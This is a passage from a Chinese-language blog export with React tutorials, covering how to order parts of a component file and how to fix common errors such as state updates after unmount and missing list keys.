tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Article</span>(<span class="params">props: Props</span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">article</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;props.title&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;renderBody()&#125;</span></span><br><span class="line"><span class="language-xml">      &#123;renderFooter()&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">article</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">renderBody</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="comment">/* article body JSX */</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">renderFooter</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="comment">/* article footer JSX */</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Article</span>;</span><br></pre></td></tr></table></figure><p><br />● 可以给这些函数前面加上<code>render</code>前缀，以将它们与其他不返回 JSX 的函数区分开；<br />● 可以将函数放在<code>return</code>语句之后，以便将与内容相关的所有内容组合在一起；<br />● 无需向这些函数传递任何参数，因为它们可以访问<code>props</code>和组件定义的所有变量；</p><p>那为什么不将它们提取为组件呢？关于部分渲染函数其实是存在争议的，一种说法是避免从组件内定义的任何函数中返回 JSX。另一种方法是将这些函数提取为单独的组件。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Article</span>(<span class="params">props: Props</span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">article</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;props.title&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">ArticleBody</span> &#123;<span class="attr">...props</span>&#125; /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">ArticleFooter</span> &#123;<span class="attr">...props</span>&#125; /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">article</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Article</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ArticleBody</span>(<span class="params">props: Props</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ArticleFooter</span>(<span class="params">props: Props</span>) &#123;&#125;</span><br></pre></td></tr></table></figure><p><br />这种情况下，就必须手动将子组件所需的局部变量通过 props 传递，因为在使用 TypeScript 时，我们通常还需要为组件的 props 定义额外的类型。最终就会得到臃肿的代码，这往往会导致代码变得难以阅读和理解：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Article</span>(<span class="params">props: Props</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> [status, setStatus] = <span class="title function_">useState</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">article</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;props.title&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">ArticleBody</span> &#123;<span class="attr">...props</span>&#125; <span class="attr">status</span>=<span class="string">&#123;status&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">ArticleFooter</span> &#123;<span class="attr">...props</span>&#125; <span class="attr">setStatus</span>=<span class="string">&#123;setStatus&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">article</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Article</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">BodyProps</span> <span class="keyword">extends</span> <span class="title class_">Props</span> &#123;</span><br><span class="line">  <span class="attr">status</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">FooterProps</span> <span class="keyword">extends</span> <span class="title class_">Props</span> &#123;</span><br><span class="line">  <span class="attr">setStatus</span>: <span class="title class_">Dispatch</span>&lt;<span class="title class_">SetStateAction</span>&lt;<span class="built_in">string</span>&gt;&gt;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ArticleBody</span>(<span class="params">props: BodyProps</span>) &#123;&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ArticleFooter</span>(<span class="params">props: FooterProps</span>) &#123;&#125;</span><br></pre></td></tr></table></figure><p><br />这些单独的组件不可以<strong>重复使用</strong>，它们仅由它们所属的组件使用；并且单独使用它们是没有意义的。因此，这种情况下，还是建议将部分 JSX 提取成渲染函数。</p><p><a name="mkCf5"></a></p><h2 id="8-局部函数"><a href="#8-局部函数" class="headerlink" title="8. 局部函数"></a>8. 局部函数</h2><p>UI 组件通常会包含事件处理函数，它们是嵌套函数，通常会更改组件的内部状态或调度操作以更新应用的状态。</p><p>另一类嵌套函数就是闭包，它们是读取组件状态或<code>props</code>的不纯函数，有助于构建组件逻辑。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Article</span>(<span class="params">props: Props</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> [email, setEmail] = <span class="title function_">useState</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">article</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;/* ... */&#125;</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">form</span> <span class="attr">onSubmit</span>=<span class="string">&#123;subscribe&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&#123;email&#125;</span> <span class="attr">onChange</span>=<span class="string">&#123;setEmail&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Subscribe<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">article</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 事件处理</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">subscribe</span>(<span class="params"></span>): <span class="built_in">void</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">canSubscribe</span>()) &#123;</span><br><span class="line">      <span class="comment">// 发送订阅请求</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">canSubscribe</span>(<span class="params"></span>): <span class="built_in">boolean</span> &#123;</span><br><span class="line">    <span class="comment">// 基于 props 和 state 的逻辑</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Article</span>;</span><br></pre></td></tr></table></figure><p><br />● 通常会使用函数声明而不是函数表达式来声明函数，因为函数是存在提升的，这允许我们在使用它们之后定义它们。这样就可以将它们放在组件函数的末尾。<code>return</code>语句之后；<br />● 如果一个函数中嵌套了另外一个函数，那么会将调用者放在被调用者之前；<br />● 通常将这些功能按使用顺序排列。</p><p><a name="lcRLz"></a></p><h2 id="9-纯函数"><a href="#9-纯函数" class="headerlink" title="9. 纯函数"></a>9. 纯函数</h2><p>最后，就是纯函数，我们可以将它们放在文件的底部，在 React 组件之外：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Article</span>(<span class="params">props: Props</span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// ❌ 纯函数不应该放在组件之中</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">getInitials</span>(<span class="params">str: <span class="built_in">string</span></span>) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Article</span>;</span><br></pre></td></tr></table></figure><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Article</span>(<span class="params">props: Props</span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ✅ 纯函数应该放在组件之外</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getInitials</span>(<span class="params">str: <span class="built_in">string</span></span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Article</span>;</span><br></pre></td></tr></table></figure><p><br />首先，纯函数没有依赖项，如 props、状态或局部变量，它们接收所有依赖项作为参数。 这意味着可以将它们放在任何地方。 但是，将它们放在组件之外还有其他原因：<br />● 它向任何阅读代码的开发人员发出信号，表示它们是纯粹的；<br />● 它们很容易测试，只需要将要测试的函数导出并导入到测试文件中即可；<br />● 如果需要提取和重用它们，可以很容易将它们很移动到其他文件。</p><p><a name="k2BR0"></a></p><h2 id="完整示例"><a href="#完整示例" class="headerlink" title="完整示例"></a>完整示例</h2><p>下面是一个完整的典型 React 组件文件。由于重点是文件的结构，因此省略了实现细节。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1️⃣ 导入依赖项</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Tag</span> &#125; <span class="keyword">from</span> <span class="string">&quot;./tag&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> styles <span class="keyword">from</span> <span class="string">&quot;./article.module.scss&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2️⃣ 静态定义</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">MAX_READING_TIME</span> = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Props</span> &#123;</span><br><span class="line">  <span class="attr">id</span>: <span class="built_in">number</span>;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">title</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">meta</span>: <span class="title class_">Metadata</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3️⃣ 组件定义</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Article</span>(<span class="params">props: Props</span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 4️⃣ 变量定义</span></span><br><span class="line">  <span class="keyword">const</span> router = <span class="title function_">useRouter</span>();</span><br><span class="line">  <span class="keyword">const</span> theme = <span class="title function_">useTheme</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> &#123; id, title, content, onSubscribe &#125; = props;</span><br><span class="line">  <span class="keyword">const</span> &#123; image, author, date &#125; = meta;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> [email, setEmail] = <span class="title class_">React</span>.<span class="title function_">useState</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> [showMenu, toggleMenu] = <span class="title class_">React</span>.<span class="title function_">useState</span>(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> summary = <span class="title class_">React</span>.<span class="title function_">useMemo</span>(<span class="function">() =&gt;</span> <span class="title function_">getSummary</span>(content), [content]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> initials = <span class="title function_">getInitials</span>(author);</span><br><span class="line">  <span class="keyword">const</span> formattedDate = <span class="title function_">getDate</span>(date);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 5️⃣ effects</span></span><br><span class="line">  <span class="title class_">React</span>.<span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;, []);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 6️⃣ 渲染内容</span></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">article</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;title&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">      &#123;renderBody()&#125;</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">form</span> <span class="attr">onSubmit</span>=<span class="string">&#123;subscribe&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        &#123;renderSubscribe()&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">article</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 7️⃣ 部分渲染</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">renderBody</span>(<span class="params"></span>) &#123; <span class="comment">/*...*/</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">renderSubscribe</span>(<span class="params"></span>) &#123; <span class="comment">/*...*/</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 8️⃣ 局部函数</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">subscribe</span>(<span class="params"></span>) &#123; <span class="comment">/*...*/</span> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 9️⃣ 纯函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getInitials</span>(<span class="params">str: <span class="built_in">string</span></span>) &#123; <span class="comment">/*...*/</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Article</span>;</span><br></pre></td></tr></table></figure><p><strong>参考：</strong><br /><a href="https://andreipfeiffer.dev/blog/2021/react-components-anatomy#variable-declarations">https://andreipfeiffer.dev/blog/2021/react-components-anatomy#variable-declarations</a></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React常见错误，如何避免？</title>
      <link href="/2023/08/15/frontend/react/react-chang-jian-cuo-wu-ru-he-bi-mian/"/>
      <url>/2023/08/15/frontend/react/react-chang-jian-cuo-wu-ru-he-bi-mian/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>下面来分享在 React 开发中常见的一些错误，以及如何避免这些错误。理解这些问题背后的细节，防止犯下类似的错误。<br><a name="y2yPa"></a></p><h2 id="1-组件卸载后执行状态更新"><a href="#1-组件卸载后执行状态更新" class="headerlink" title="1. 组件卸载后执行状态更新"></a>1. 组件卸载后执行状态更新</h2><p><strong>报错信息：</strong><code>Can’t perform a React state update on an unmounted component</code></p><p>这个报错就是因为在组件树的某个地方，状态更新被触发到已经卸载的组件上了。也就是说，我们不能在组件销毁后设置 state，防止出现内存泄漏。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Component</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [data, setData] = <span class="title function_">useState</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">  <span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">fetchAsyncData</span>().<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> <span class="title function_">setData</span>(data));</span><br><span class="line">  &#125;, []);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>比如，在请求数据时，由于跳转到了 B 页面，A 页面的数据请求还在进行中，但是页面已经销毁了，就会出现这种情况。那该如何解决这个问题呢？有两种方法：</p><p><a name="sdo8h"></a></p><h3 id="（1）组件卸载时取消异步请求"><a href="#（1）组件卸载时取消异步请求" class="headerlink" title="（1）组件卸载时取消异步请求"></a>（1）组件卸载时取消异步请求</h3><p>第一种方法（推荐），就是在组件卸载时取消异步请求。一些异步请求库提供了取消异步请求的方法。如果没有使用第三方库，可以使用 <code>AbortController</code> 来取消。这种方法本质上就是在组件卸载时取消副作用：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Component</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [data, setData] = <span class="title function_">useState</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">  <span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> controller = <span class="keyword">new</span> <span class="title class_">AbortController</span>();</span><br><span class="line">    <span class="title function_">fetch</span>(url, &#123; <span class="attr">signal</span>: controller.<span class="property">signal</span> &#125;).<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> <span class="title function_">setData</span>(data));</span><br><span class="line">    <span class="keyword">return</span> <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      controller.<span class="title function_">abort</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, []);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><a name="ejVm7"></a></p><h3 id="（2）跟踪组件是否已挂载"><a href="#（2）跟踪组件是否已挂载" class="headerlink" title="（2）跟踪组件是否已挂载"></a>（2）跟踪组件是否已挂载</h3><p>另外，可以跟踪组件的挂载状态，如果还没挂载或已经卸载，返回 false；否则返回 true：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Component</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [data, setData] = <span class="title function_">useState</span>(<span class="literal">null</span>);</span><br><span class="line">  <span class="keyword">const</span> isMounted = <span class="title function_">useRef</span>(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">fetchAsyncData</span>().<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span>(isMounted.<span class="property">current</span>) &#123;</span><br><span class="line">        <span class="title function_">setData</span>(data);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      isMounted.<span class="property">current</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;, []);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />不过，不建议使用这种方法。这样保留了未挂载组件的引用，可能会导致内存泄漏和性能问题。</p><p><a name="t7gvE"></a></p><h2 id="2-渲染列表时不使用-key"><a href="#2-渲染列表时不使用-key" class="headerlink" title="2. 渲染列表时不使用 key"></a>2. 渲染列表时不使用 key</h2><p><strong>报错信息：</strong><code>Warning: Each child in a list should have a unique key prop</code></p><p>React 开发中最常见的就是遍历数组来渲染组件。在 JSX 中，可以使用 Array.map 将该逻辑嵌入到组件中，并在回调中返回所需的组件。如下：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Card</span> &#125; <span class="keyword">from</span> <span class="string">&quot;./Card&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> data = [</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">text</span>: <span class="string">&quot;JavaScript&quot;</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">2</span>, <span class="attr">text</span>: <span class="string">&quot;TypeScript&quot;</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">3</span>, <span class="attr">text</span>: <span class="string">&quot;React&quot;</span> &#125;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;data.map((content) =&gt; (</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;card&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">Card</span> <span class="attr">text</span>=<span class="string">&#123;content.text&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      ))&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />这样会收到如下警告：<code>Warning: Each child in a list should have a unique key prop</code>，这表示需要给生成的每个组件一个唯一的 key。所以，要在 map 回调返回的 JSX 的最外层元素添加一个 key 值，该值应该是一个字符串或者数字，并且在这个组件列表中应该是唯一的。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span 